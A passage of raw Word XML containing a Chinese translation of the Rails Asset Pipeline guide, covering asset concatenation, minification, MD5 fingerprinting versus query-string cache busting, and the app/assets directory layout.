          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法的尾部能连结 JavaScript 或 CSS 资源。但这个技术有些不足。例如，它不能预先产生缓存和它不能显式调用由第三方库提供的资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB9804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从 3.1 版开始， Rails 默认将所有的 JavaScript 文件连结成一个主要的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件，和将所有的 CSS 文件连结成一个主要的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件。 你将可以在本指南后面学习到如何自定义管理这些文件的策略。在生产环境中， Rails 给每个文件名插入一个 MD5 指纹,以便文件被网页浏览器缓存。你可以通过修改指纹使缓存无效，这在你修改文件后会自动发生。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7C0BC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asset pipline 的第二个功能是资源的缩小或者压缩。对于 CSS 文件，是通过去除空格和注释来实现的。对于 JavsScript, 会有更多的复杂过程。你可以从选项中选择一套构件或者指定你自己的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DB8F4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asset pipline 的第三个功能是它能你使用更高级的语言来编写资源，然后预编译成实质的资源。默认支持的语言包括 CSS 的 Sass，JavaScript 的 CoffeeScript 和可用于所有资源的 ERB.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391572E9"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1.2 什么是指纹识别和为什么我们要关心</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E62AB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指纹识别是一项使一个文件的名字根据文件的内容而定的技术。当文件的内容改变了，文件名也会变。 这提供了辨别两个版本的文件是同一个文件的方法，即使是跨越不同的服务器和部署日期。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4702632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当一个文件的名字是唯一的并且基于它的内容， HTTP 头部可以被设定为在任何地方缓存(无论是在 CDNs, 在 ISPs, 在网络设备里，或者是在网页浏览器里)去保存它们自己内容的副本。当内容更新了，指纹识别也会变更。这会引起远端客户端发出一个新的请求获得内容。这一般被叫做 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>清除缓存</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A3E9B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Rails 用于指纹识别的技术是将内容的 hash 插入到名字里，通常在尾部。例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>global.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> CSS文件可以被重命名为一个带有它的内容的 MD5 digest:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="410A157C" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="484959E2" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="4140174"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>global-908e25f4bf641868d8683022a5b62f54.css</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3AE6FC7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这是 Rails asset pipline 所使用的策略。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A70CAA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Rails 的旧策略是为每个资源附加一个以日期为基础的查询字符串，这些 asset 都会与一个内建的 helper 关联. 原先文件生成的代码看起来像这样:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="66FDBE84" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="641A7B6C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="423235044"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>/stylesheets/global.css?1309495796</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F82B77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这个查询字符串策略有这些弊端:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C4AD64" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="246"/>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b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>当文件名只是查询参数部分的不同，不是所有的缓存都会确实地缓存了内容</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId957" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Steve Souders recommends</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, “…避免对可缓存资源使用查询字符串”。它发现在这种情况下有 5-20% 的请求都不会被缓存。特别是针对一些CDNs的独立缓存，查询字符串起不到太大的作用。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483C9D69" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="246"/>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b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>在多服务器环境中，文件名可以在不同的节点之间改变。</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Rails 2.x 默认的查询字符基于文件的修改时间。当资源被部署到某个集群，不能确定时间戳会是一样的。这会导致随着处理请求的服务器的不同而使用不同的值。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586F94F1" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="246"/>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b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>过多的独立缓存</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">每当静态资源随着新版本的代码部署时，_所有_这些文件的 mtime 都会改变，迫使所有的远程客户端重新刷新它们，即使这些资源的内容没有发生改变。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB1CC8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指纹识别没有使用查询字符串而且确保了文件名与其内容保持同步，所以解决了这些问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F00FF6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指纹识别在生产环境下是默认开启的，而在所有其它的环境下是关闭的。你可以通过配置文件的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.digest</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选参去开启或者关闭它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64523B5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更多读物:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BBC323" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="247"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId958" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Optimize caching</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B39EE94" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="247"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId959" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Revving Filenames: don’t use querystring</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="58828DF0"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2 如何使用 Asset Pipeline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238C18C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 Rails 之前的版本里，所有的资源都放置在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的子目录下比如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>images</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>javascript</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stylesheets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 对于 asset pipline, 这些资源现在被指定到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录。这个目录下的所有文件都通过 Sprockets 中间件供应，这个中间件通过引入 sprockets gem 使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509FC6B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资源依然可以被放置在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录下。 所有位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录下的文件都会作为静态资源通过应用程序或者 web 服务器供应。在它们被供应之前必须作一些预处理的文件要放在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9813D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在生产中，Rails 默认预编译这些文件到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。 预编译过后的副本会被 web 服务器作为静态资源供应。在生产中，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的文件从不被直接供应。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113D9DA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当你创建一个 scaffold 或者一个控制器时，Rails 也会为该控制器创建一个 JavaScript 文件 (或者 CoffeeScript 文件，如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>coffee-rails</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gem 的话) 和一个层叠式样式表文件 (或者 SCSS 文件，如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sass-rails</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的话)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D70B1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例如，如果你生成一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ProjectsController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, Rails 会同时添加一个新文件位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/javascripts/projects.js.coffee</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和另一个位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/projects.css.scss</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。你应该将针对某个控制器的 Javascript 和 CSS 放置到它们各自的资源文件里，以便这些文件可以只为这些控制器被加载, 使用诸如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;%= javascript_include_tag params[:controller] %&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
